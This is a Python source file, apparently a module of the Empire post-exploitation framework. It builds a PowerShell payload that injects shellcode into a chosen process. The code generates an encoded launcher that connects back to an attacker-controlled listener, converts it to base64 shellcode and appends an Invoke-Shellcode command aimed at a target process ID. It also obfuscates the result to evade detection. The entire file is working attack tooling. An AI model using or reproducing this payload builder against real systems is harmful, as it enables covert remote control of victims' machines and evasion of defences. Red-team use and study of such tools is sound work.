from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = ""):
        listener_name = params['Listener']
        proc_id = params['ProcId'].strip()
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        arch = params['Arch']

        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        # If you'd just like to import a subset of the functions from the
        #   module source, use the following:
        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
        script = module_code
        script_end = "; shellcode injected into pid {}".format(str(proc_id))

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: {}".format(listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)

            if launcher == '':
                return handle_error_message('[!] Error in launcher generation.')
            else:
                launcher_code = launcher.split(' ')[-1]

                sc = main_menu.stagers.generate_powershell_shellcode(launcher_code, arch)

                encoded_sc = helpers.encode_base64(sc)

        # Add any arguments to the end execution of the script

        # t = iter(sc)
        # pow_array = ',0x'.join(a+b for a,b in zip(t, t))
        # pow_array = "@(0x" + pow_array + " )"
        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(
            proc_id, encoded_sc)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
